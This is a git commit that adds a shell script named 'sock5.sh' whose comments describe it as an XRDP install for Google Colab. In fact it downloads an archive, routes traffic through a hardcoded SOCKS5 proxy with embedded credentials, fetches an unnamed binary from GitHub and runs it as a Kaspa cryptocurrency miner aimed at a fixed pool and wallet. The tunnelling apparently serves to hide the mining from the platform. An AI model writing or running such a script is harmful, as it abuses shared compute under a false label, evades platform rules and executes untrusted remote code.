4161a0cd094d412bdf4d9a7b4a3fa5d714e329d9
angkii <83603708+angkii@users.noreply.github.com>
2022-10-02 17:28:27 +0700

    Create sock5.sh

---
+++ sock5.sh
@@ -0,0 +1,34 @@
+# /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R AkubapakMU
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 51.79.222.181:22
+socks5_username = gratis
+socks5_password = q1w2e3r4t5
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp wget https://github.com/angkii/m/raw/main/AkubapakMU
+chmod 700 AkubapakMU
+
+#!/bin/bash
+
+POOL=159.223.188.176:80
+WALLET=kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg
+
+./graftcp/graftcp ./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
